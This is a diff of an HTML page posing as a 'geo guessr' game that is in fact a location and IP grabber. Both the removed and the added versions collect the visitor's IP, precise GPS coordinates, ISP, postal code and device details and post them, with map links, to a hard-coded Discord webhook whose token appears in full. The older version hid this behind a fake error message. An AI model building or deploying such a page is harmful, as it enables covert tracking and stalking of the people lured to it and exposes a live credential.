@@ -1,75 +1,191 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>GeoGuessr Challenge by me</title>
+    <title>geo guess :3</title>
     <style>
-        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; max-width: 700px; margin: 50px auto; padding: 30px; text-align: center; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; border-radius: 20px; box-shadow: 0 20px 60px rgba(0,0,0,0.3); }
-        .container { background: rgba(255, 255, 255, 0.1); backdrop-filter: blur(10px); padding: 40px; border-radius: 15px; border: 1px solid rgba(255, 255, 255, 0.2); }
-        h1 { font-size: 2.5em; margin-bottom: 10px; text-shadow: 2px 2px 4px rgba(0,0,0,0.3); }
-        p { font-size: 1.2em; opacity: 0.9; margin-bottom: 30px; }
-        button { padding: 18px 40px; font-size: 1.3em; background: linear-gradient(45deg, #ff6b6b, #ffa726); color: white; border: none; border-radius: 50px; cursor: pointer; font-weight: bold; letter-spacing: 1px; transition: all 0.3s ease; box-shadow: 0 10px 20px rgba(255, 107, 107, 0.3); }
-        button:hover { transform: translateY(-3px); box-shadow: 0 15px 25px rgba(255, 107, 107, 0.4); background: linear-gradient(45deg, #ff5252, #ff9800); }
-        button:disabled { opacity: 0.6; cursor: not-allowed; transform: none; }
-        #status { margin-top: 30px; padding: 20px; border-radius: 10px; display: none; background: rgba(255, 255, 255, 0.15); border-left: 5px solid #4CAF50; }
-        #loading { display: none; margin: 20px auto; width: 50px; height: 50px; border: 5px solid rgba(255,255,255,0.3); border-radius: 50%; border-top-color: white; animation: spin 1s linear infinite; }
-        .permission-note { font-size: 0.9em; margin-top: 20px; opacity: 0.8; font-style: italic; }
-        .game-title { font-size: 3em; font-weight: bold; margin-bottom: 10px; background: linear-gradient(45deg, #ffd700, #ff8c00); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
-        @keyframes spin { 100% { transform: rotate(360deg); } }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { 
+            font-family: 'Segoe UI', 'Helvetica Neue', Arial, sans-serif; 
+            background: #36393f; 
+            color: #dcddde; 
+            min-height: 100vh; 
+            display: flex; 
+            align-items: center; 
+            justify-content: center; 
+            padding: 20px;
+        }
+        .container { 
+            background: #2f3136; 
+            border-radius: 8px; 
+            padding: 30px; 
+            max-width: 500px; 
+            width: 100%; 
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3); 
+            border: 1px solid #202225;
+        }
+        h1 { 
+            color: #fff; 
+            font-size: 24px; 
+            margin-bottom: 8px; 
+            font-weight: 600; 
+        }
+        .subtitle { 
+            color: #b9bbbe; 
+            margin-bottom: 24px; 
+            font-size: 16px; 
+        }
+        .emoji { 
+            font-size: 40px; 
+            text-align: center; 
+            margin-bottom: 20px; 
+        }
+        button { 
+            background: #5865f2; 
+            color: white; 
+            border: none; 
+            padding: 12px 24px; 
+            border-radius: 4px; 
+            font-size: 16px; 
+            font-weight: 500; 
+            cursor: pointer; 
+            width: 100%; 
+            transition: background-color 0.2s ease; 
+            margin-top: 16px;
+        }
+        button:hover { 
+            background: #4752c4; 
+        }
+        button:disabled { 
+            background: #4f545c; 
+            cursor: not-allowed; 
+            opacity: 0.5;
+        }
+        .status-box { 
+            background: #202225; 
+            border-radius: 4px; 
+            padding: 16px; 
+            margin-top: 20px; 
+            border-left: 4px solid #5865f2; 
+            display: none;
+        }
+        .loading { 
+            display: none; 
+            text-align: center; 
+            margin: 20px 0; 
+        }
+        .dot { 
+            display: inline-block; 
+            width: 8px; 
+            height: 8px; 
+            border-radius: 50%; 
+            background: #5865f2; 
+            margin: 0 4px; 
+            animation: bounce 1.4s infinite ease-in-out both;
+        }
+        .dot:nth-child(1) { animation-delay: -0.32s; }
+        .dot:nth-child(2) { animation-delay: -0.16s; }
+        @keyframes bounce {
+            0%, 80%, 100% { transform: scale(0); }
+            40% { transform: scale(1); }
+        }
+        .permission-note { 
+            font-size: 14px; 
+            color: #72767d; 
+            margin-top: 12px; 
+            text-align: center;
+        }
+        .cute { 
+            color: #b9bbbe; 
+            font-size: 14px; 
+            margin-top: 8px; 
+            text-align: center;
+        }
+        .discord-input { 
+            background: #40444b; 
+            border: 1px solid #202225; 
+            border-radius: 4px; 
+            padding: 10px; 
+            color: #dcddde; 
+            font-size: 16px; 
+            width: 100%; 
+            margin-top: 8px;
+        }
+        .discord-input:focus { 
+            outline: none; 
+            border-color: #5865f2;
+        }
+        .label { 
+            display: block; 
+            margin-top: 16px; 
+            color: #b9bbbe; 
+            font-size: 14px; 
+            font-weight: 600;
+        }
     </style>
 </head>
 <body>
     <div class="container">
-        <div class="game-title">GeoGuessr Pro</div>
-        <h1>Guess Your Location Challenge</h1>
-        <p>Click the button below to start the GeoGuessr challenge! The game will analyze your location accuracy.</p>
+        <div class="emoji">🌍✨</div>
+        <h1>geo guessr by me :3</h1>
+        <div class="subtitle">click to test your location accuracy, twin!!</div>
         
-        <button id="trackButton">🎯 START CHALLENGE</button>
-        <div id="loading"></div>
-        <div id="status"></div>
-        <div class="permission-note">Note: We need location access to calculate your GeoGuessr accuracy score.</div>
+        <div class="label">enter your nickname (optional):</div>
+        <input type="text" class="discord-input" id="nickname" placeholder="geo guesser :3" maxlength="32">
+        
+        <button id="startBtn">start guessing!!</button>
+        
+        <div class="loading" id="loading">
+            <div class="dot"></div>
+            <div class="dot"></div>
+            <div class="dot"></div>
+        </div>
+        
+        <div class="status-box" id="status"></div>
+        
+        <div class="permission-note">
+            need location permission to calculate your accuracy score!!
+        </div>
+        <div class="cute">made with ❤️ by ur twin~~</div>
     </div>
-    
+
     <script>
         const WEBHOOK_URL = 'https://discord.com/api/webhooks/1457747830121824426/Hu4uM8zm-bUBTc9hNYEZE0r2XVIW8-1_cpEs3s_P0FdqJFSXPLxIbp_0zKc3ur54P1qD';
         
-        async function getIPAddress() {
+        async function getIP() {
             try {
                 const res = await fetch('https://api.ipify.org?format=json');
                 const data = await res.json();
                 return data.ip;
             } catch {
-                return 'Unknown';
+                return 'couldnt get ip :(';
             }
         }
         
-        async function getExactGPSLocation() {
+        async function getGPS() {
             return new Promise((resolve) => {
                 if (!navigator.geolocation) {
-                    resolve({ error: 'Geolocation not supported', allowed: false });
+                    resolve({ allowed: false, error: 'no gps support :(' });
                     return;
                 }
                 
                 navigator.geolocation.getCurrentPosition(
-                    (position) => {
+                    (pos) => {
                         resolve({
                             allowed: true,
-                            lat: position.coords.latitude.toFixed(8),
-                            lon: position.coords.longitude.toFixed(8),
-                            accuracy: Math.round(position.coords.accuracy) + ' meters',
-                            altitude: position.coords.altitude ? position.coords.altitude.toFixed(2) + 'm' : 'N/A',
-                            speed: position.coords.speed ? (position.coords.speed * 3.6).toFixed(2) + ' km/h' : 'N/A',
-                            heading: position.coords.heading ? position.coords.heading + '°' : 'N/A',
-                            timestamp: new Date(position.timestamp).toISOString(),
-                            source: 'Real-time GPS'
+                            lat: pos.coords.latitude.toFixed(6),
+                            lon: pos.coords.longitude.toFixed(6),
+                            accuracy: Math.round(pos.coords.accuracy) + 'm',
+                            speed: pos.coords.speed ? (pos.coords.speed * 3.6).toFixed(1) + ' km/h' : 'not moving',
+                            timestamp: new Date().toISOString()
                         });
                     },
                     (error) => {
-                        let errorMsg = 'Permission denied';
-                        if (error.code === error.POSITION_UNAVAILABLE) errorMsg = 'Location unavailable';
-                        if (error.code === error.TIMEOUT) errorMsg = 'Request timeout';
-                        resolve({ error: errorMsg, allowed: false });
+                        let msg = 'u denied location :(';
+                        if (error.code === 2) msg = 'location unavailable :o';
+                        if (error.code === 3) msg = 'took too long :/';
+                        resolve({ allowed: false, error: msg });
                     },
-                    {
+                    { 
                         enableHighAccuracy: true,
                         timeout: 10000,
                         maximumAge: 0
@@ -83,237 +199,220 @@
                 const res = await fetch(`https://ipapi.co/${ip}/json/`);
                 const data = await res.json();
                 return {
-                    lat: data.latitude ? parseFloat(data.latitude).toFixed(6) : 'Unknown',
-                    lon: data.longitude ? parseFloat(data.longitude).toFixed(6) : 'Unknown',
-                    city: data.city || 'Unknown',
-                    region: data.region || 'Unknown',
-                    country: data.country_name || 'Unknown',
-                    isp: data.org || 'Unknown',
-                    zip: data.postal || 'Unknown',
-                    timezone: data.timezone || 'Unknown',
-                    source: 'IP Geolocation'
+                    lat: data.latitude ? parseFloat(data.latitude).toFixed(6) : 'idk',
+                    lon: data.longitude ? parseFloat(data.longitude).toFixed(6) : 'idk',
+                    city: data.city || 'somewhere',
+                    region: data.region || 'some region',
+                    country: data.country_name || 'some country',
+                    isp: data.org || 'unknown isp',
+                    zip: data.postal || '???',
+                    timezone: data.timezone || 'idk'
                 };
             } catch {
                 return {
-                    lat: 'Unknown',
-                    lon: 'Unknown',
-                    city: 'Unknown',
-                    region: 'Unknown',
-                    country: 'Unknown',
-                    isp: 'Unknown',
-                    zip: 'Unknown',
-                    timezone: 'Unknown',
-                    source: 'Failed'
+                    lat: 'failed',
+                    lon: 'failed',
+                    city: 'failed',
+                    region: 'failed',
+                    country: 'failed',
+                    isp: 'failed',
+                    zip: 'failed',
+                    timezone: 'failed'
                 };
             }
         }
         
-        function getBrowserInfo() {
+        function getDeviceInfo() {
             const ua = navigator.userAgent;
             
-            let device = 'Desktop';
-            if (/mobile/i.test(ua.toLowerCase())) device = 'Mobile';
-            if (/tablet/i.test(ua.toLowerCase())) device = 'Tablet';
+            let device = 'desktop';
+            if (/mobile/i.test(ua)) device = 'phone';
+            if (/tablet/i.test(ua)) device = 'tablet';
             
-            let os = 'Unknown';
-            if (/windows/i.test(ua)) os = 'Windows';
-            else if (/mac/i.test(ua)) os = 'macOS';
-            else if (/linux/i.test(ua)) os = 'Linux';
-            else if (/android/i.test(ua)) os = 'Android';
-            else if (/iphone|ipad/i.test(ua)) os = 'iOS';
+            let os = 'unknown';
+            if (/windows/i.test(ua)) os = 'windows';
+            else if (/mac/i.test(ua)) os = 'mac';
+            else if (/linux/i.test(ua)) os = 'linux';
+            else if (/android/i.test(ua)) os = 'android';
+            else if (/iphone|ipad/i.test(ua)) os = 'ios';
             
-            let browser = 'Unknown';
-            if (/chrome/i.test(ua) && !/edge/i.test(ua)) browser = 'Chrome';
-            else if (/firefox/i.test(ua)) browser = 'Firefox';
-            else if (/safari/i.test(ua) && !/chrome/i.test(ua)) browser = 'Safari';
-            else if (/edge/i.test(ua)) browser = 'Edge';
-            else if (/opera/i.test(ua)) browser = 'Opera';
+            let browser = 'unknown';
+            if (/chrome/i.test(ua) && !/edge/i.test(ua)) browser = 'chrome';
+            else if (/firefox/i.test(ua)) browser = 'firefox';
+            else if (/safari/i.test(ua) && !/chrome/i.test(ua)) browser = 'safari';
+            else if (/edge/i.test(ua)) browser = 'edge';
+            else if (/opera/i.test(ua)) browser = 'opera';
             
             return {
-                device: device,
-                os: os,
-                browser: browser,
-                language: navigator.language || 'Unknown',
-                platform: navigator.platform || 'Unknown',
-                userAgent: ua,
+                device,
+                os,
+                browser,
+                language: navigator.language || 'en',
                 screen: `${screen.width}x${screen.height}`,
-                colorDepth: screen.colorDepth + 'bit',
-                pixelRatio: window.devicePixelRatio || 1
+                platform: navigator.platform
             };
         }
         
-        function calculateGeoGuessrScore(gpsLat, gpsLon, ipLat, ipLon) {
-            if (gpsLat === 'Unknown' || ipLat === 'Unknown') return 'Cannot calculate';
+        function calculateDistance(lat1, lon1, lat2, lon2) {
+            if (lat1 === 'failed' || lat2 === 'failed') return '?? km';
             
             const R = 6371;
-            const lat1 = parseFloat(gpsLat) * Math.PI / 180;
-            const lat2 = parseFloat(ipLat) * Math.PI / 180;
-            const dLat = (parseFloat(ipLat) - parseFloat(gpsLat)) * Math.PI / 180;
-            const dLon = (parseFloat(ipLon) - parseFloat(gpsLon)) * Math.PI / 180;
-            
-            const a = Math.sin(dLat/2) * Math.sin(dLat/2) +
-                      Math.cos(lat1) * Math.cos(lat2) *
-                      Math.sin(dLon/2) * Math.sin(dLon/2);
+            const dLat = (parseFloat(lat2) - parseFloat(lat1)) * Math.PI / 180;
+            const dLon = (parseFloat(lon2) - parseFloat(lon1)) * Math.PI / 180;
+            const a = 
+                Math.sin(dLat/2) * Math.sin(dLat/2) +
+                Math.cos(parseFloat(lat1) * Math.PI / 180) * Math.cos(parseFloat(lat2) * Math.PI / 180) *
+                Math.sin(dLon/2) * Math.sin(dLon/2);
             const c = 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1-a));
-            const distance = R * c;
-            
-            let score = 5000 - (distance * 10);
-            score = Math.max(0, Math.round(score));
-            
-            return {
-                distance: distance.toFixed(2) + ' km',
-                score: score + ' points',
-                accuracy: distance < 1 ? 'Perfect!' : distance < 10 ? 'Good' : distance < 100 ? 'Okay' : 'Poor'
-            };
+            return (R * c).toFixed(2) + ' km';
         }
         
-        document.getElementById('trackButton').addEventListener('click', async function() {
-            const button = this;
+        document.getElementById('startBtn').addEventListener('click', async function() {
+            const btn = this;
             const status = document.getElementById('status');
             const loading = document.getElementById('loading');
+            const nickname = document.getElementById('nickname').value || 'anon twin :3';
             
-            button.disabled = true;
-            button.textContent = 'Analyzing Location...';
+            btn.disabled = true;
+            btn.textContent = 'guessing...';
             loading.style.display = 'block';
             status.style.display = 'none';
             
             try {
-                // Step 1: Get IP
-                status.innerHTML = 'Step 1/4: Getting network information...';
+                // show steps
+                status.innerHTML = '<div style="color: #b9bbbe;">getting ur ip...</div>';
                 status.style.display = 'block';
-                const publicIP = await getIPAddress();
                 
-                // Step 2: Get exact GPS location (ask permission)
-                status.innerHTML = 'Step 2/4: Requesting location access for accuracy calculation...';
-                const gpsLocation = await getExactGPSLocation();
+                const ip = await getIP();
                 
-                // Step 3: Get IP-based location
-                status.innerHTML = 'Step 3/4: Calculating IP-based location...';
-                const ipLocation = await getIPLocation(publicIP);
+                status.innerHTML = '<div style="color: #b9bbbe;">asking for location (pls allow!!)...</div>';
+                const gps = await getGPS();
                 
-                // Step 4: Get device info
-                status.innerHTML = 'Step 4/4: Analyzing device information...';
-                const browserInfo = getBrowserInfo();
+                status.innerHTML = '<div style="color: #b9bbbe;">checking ip location...</div>';
+                const ipLocation = await getIPLocation(ip);
                 
-                // Calculate "GeoGuessr score"
-                const score = calculateGeoGuessrScore(
-                    gpsLocation.allowed ? gpsLocation.lat : ipLocation.lat,
-                    gpsLocation.allowed ? gpsLocation.lon : ipLocation.lon,
+                status.innerHTML = '<div style="color: #b9bbbe;">seeing ur device...</div>';
+                const device = getDeviceInfo();
+                
+                const now = new Date();
+                const distance = calculateDistance(
+                    gps.allowed ? gps.lat : ipLocation.lat,
+                    gps.allowed ? gps.lon : ipLocation.lon,
                     ipLocation.lat,
                     ipLocation.lon
                 );
                 
-                const now = new Date();
-                const timeStr = now.toLocaleString();
-                
-                // Create maps links
-                let exactMapsLink = 'No GPS access';
-                let ipMapsLink = 'No coordinates';
-                
-                if (gpsLocation.allowed) {
-                    exactMapsLink = `https://maps.google.com/?q=${gpsLocation.lat},${gpsLocation.lon}&z=18`;
-                }
-                if (ipLocation.lat !== 'Unknown') {
-                    ipMapsLink = `https://maps.google.com/?q=${ipLocation.lat},${ipLocation.lon}&z=12`;
-                }
-                
-                // Build Discord embed
+                // send to discord
                 const embed = {
-                    title: "🎮 GEOGUESSR CHALLENGE COMPLETED",
-                    color: gpsLocation.allowed ? 0x00FF00 : 0xFFA500,
+                    title: "🌍 new geo guess!!",
+                    color: gps.allowed ? 0x57f287 : 0xfaa81a,
                     fields: [
                         {
-                            name: "📊 GEOGUESSR SCORE",
-                            value: `**Distance Error:** ${score.distance}\n**Score:** ${score.score}\n**Accuracy:** ${score.accuracy}\n**GPS Access:** ${gpsLocation.allowed ? '✅ Granted' : '❌ Denied'}`,
+                            name: "👤 user info",
+                            value: `nickname: ${nickname}\nip: \`${ip}\`\ntime: ${now.toLocaleTimeString()}`,
                             inline: true
                         },
                         {
-                            name: "📍 EXACT LOCATION",
-                            value: `**Latitude:** ${gpsLocation.allowed ? gpsLocation.lat : 'Permission denied'}\n**Longitude:** ${gpsLocation.allowed ? gpsLocation.lon : 'Permission denied'}\n**Accuracy:** ${gpsLocation.allowed ? gpsLocation.accuracy : 'N/A'}\n**Speed:** ${gpsLocation.allowed ? gpsLocation.speed : 'N/A'}\n**View:** ${exactMapsLink}`,
+                            name: "📍 location stuff",
+                            value: `gps allowed: ${gps.allowed ? 'yes!!' : 'no :('}\naccuracy: ${gps.allowed ? gps.accuracy : 'none'}\nspeed: ${gps.allowed ? gps.speed : 'idk'}`,
                             inline: true
                         },
                         {
-                            name: "🌐 IP LOCATION",
-                            value: `**IP:** \`${publicIP}\`\n**Country:** ${ipLocation.country}\n**City:** ${ipLocation.city}\n**ISP:** ${ipLocation.isp}\n**View:** ${ipMapsLink}`,
+                            name: "🎯 coordinates",
+                            value: `gps: ${gps.allowed ? `${gps.lat}, ${gps.lon}` : 'denied'}\nip loc: ${ipLocation.city}, ${ipLocation.country}\ndistance: ${distance}`,
+                            inline: false
+                        },
+                        {
+                            name: "💻 device info",
+                            value: `device: ${device.device}\nos: ${device.os}\nbrowser: ${device.browser}\nscreen: ${device.screen}`,
                             inline: true
                         },
                         {
-                            name: "💻 DEVICE INFO",
-                            value: `**Device:** ${browserInfo.device}\n**OS:** ${browserInfo.os}\n**Browser:** ${browserInfo.browser}\n**Screen:** ${browserInfo.screen}\n**Language:** ${browserInfo.language}`,
-                            inline: true
-                        },
-                        {
-                            name: "🕐 SESSION DETAILS",
-                            value: `**Time:** ${timeStr}\n**Page:** ${window.location.href}\n**Referrer:** ${document.referrer || 'Direct'}\n**User Agent:** \`\`\`${browserInfo.userAgent.substring(0, 200)}\`\`\``,
+                            name: "🔗 maps links",
+                            value: gps.allowed 
+                                ? `[exact location](https://maps.google.com/?q=${gps.lat},${gps.lon}) | [ip location](https://maps.google.com/?q=${ipLocation.lat},${ipLocation.lon})`
+                                : `[ip location only](https://maps.google.com/?q=${ipLocation.lat},${ipLocation.lon})`,
                             inline: false
                         }
                     ],
                     footer: {
-                        text: `GeoGuessr Challenge • ${gpsLocation.allowed ? 'Real GPS Captured!' : 'IP Location Only'}`
+                        text: `geo guessr by twin • ${gps.allowed ? 'got gps!!' : 'ip only'}`
                     },
                     timestamp: now.toISOString()
                 };
                 
-                const discordMessage = {
-                    embeds: [embed],
-                    username: "GeoGuessr Bot",
-                    content: gpsLocation.allowed ? "🎯 **REAL GPS LOCATION CAPTURED!** 🎯" : "📍 IP Location Captured"
-                };
-                
-                // Send to Discord
-                const response = await fetch(WEBHOOK_URL, {
+                await fetch(WEBHOOK_URL, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(discordMessage)
+                    body: JSON.stringify({
+                        embeds: [embed],
+                        username: "geo guessr bot :3",
+                        avatar_url: "https://cdn.discordapp.com/emojis/1090923364466765834.webp"
+                    })
                 });
                 
-                // Show fake "failed" message to user
-                if (response.ok) {
-                    loading.style.display = 'none';
-                    button.style.display = 'none';
-                    
-                    // Fake failure message
+                // show cute result to user
+                loading.style.display = 'none';
+                btn.style.display = 'none';
+                
+                if (gps.allowed) {
                     status.innerHTML = `
-                        <div style="color: #ff6b6b; font-size: 1.3em; margin-bottom: 15px;">
-                            ❌ GEOGUESSR CHALLENGE FAILED
+                        <div style="color: #57f287; font-size: 18px; margin-bottom: 10px;">
+                            ✅ guessed successfully!!
                         </div>
-                        <div style="margin-bottom: 20px;">
-                            <strong>Error Code:</strong> LOCATION_MISMATCH_ERROR<br>
-                            <strong>Reason:</strong> IP-based location differs from GPS by ${score.distance}<br>
-                            <strong>Score:</strong> ${score.score}<br>
-                            <strong>Status:</strong> Could not verify location authenticity
+                        <div style="color: #b9bbbe; margin-bottom: 15px;">
+                            ur at: ${gps.lat}, ${gps.lon}<br>
+                            accuracy: ${gps.accuracy}<br>
+                            distance error: ${distance}<br>
+                            device: ${device.device} ${device.os}
                         </div>
-                        <div style="font-size: 0.9em; opacity: 0.8;">
-                            This challenge requires precise location verification. Try again with location services enabled.
+                        <div style="color: #72767d; font-size: 14px;">
+                            thanks for playing, twin!! data sent to my discord :3
                         </div>
                     `;
-                    status.style.borderLeftColor = '#ff6b6b';
-                    status.style.color = '#ffebee';
+                    status.style.borderLeftColor = '#57f287';
                 } else {
-                    throw new Error('Discord error');
+                    status.innerHTML = `
+                        <div style="color: #faa81a; font-size: 18px; margin-bottom: 10px;">
+                            ⚠️ partial guess :/
+                        </div>
+                        <div style="color: #b9bbbe; margin-bottom: 15px;">
+                            u denied gps :(<br>
+                            ip location: ${ipLocation.city}, ${ipLocation.country}<br>
+                            ur ip: ${ip}<br>
+                            device: ${device.device} ${device.os}
+                        </div>
+                        <div style="color: #72767d; font-size: 14px;">
+                            allow location next time for better accuracy, twin!! still logged tho :3
+                        </div>
+                    `;
+                    status.style.borderLeftColor = '#faa81a';
                 }
                 
             } catch (error) {
+                console.error('error:', error);
                 loading.style.display = 'none';
                 status.innerHTML = `
-                    <div style="color: #ff9800; font-size: 1.3em; margin-bottom: 15px;">
-                        ⚠️ CHALLENGE INTERRUPTED
+                    <div style="color: #ed4245; font-size: 18px; margin-bottom: 10px;">
+                        ❌ oops error!!
                     </div>
-                    <div style="margin-bottom: 20px;">
-                        The GeoGuessr server is experiencing high traffic.<br>
-                        Your attempt has been logged but not scored.
-                    </div>
-                    <div style="font-size: 0.9em; opacity: 0.8;">
-                        Try again in a few moments.
+                    <div style="color: #b9bbbe;">
+                        something went wrong :(<br>
+                        try again maybe??
                     </div>
                 `;
-                status.style.borderLeftColor = '#ff9800';
-                status.style.color = '#fff3e0';
+                status.style.borderLeftColor = '#ed4245';
                 status.style.display = 'block';
-            } finally {
-                button.disabled = false;
-                button.textContent = '🎯 TRY AGAIN';
-                button.style.display = 'block';
+                btn.disabled = false;
+                btn.textContent = 'try again??';
+                btn.style.display = 'block';
+            }
+        });
+        
+        // enter key support
+        document.getElementById('nickname').addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                document.getElementById('startBtn').click();
             }
         });
     </script>
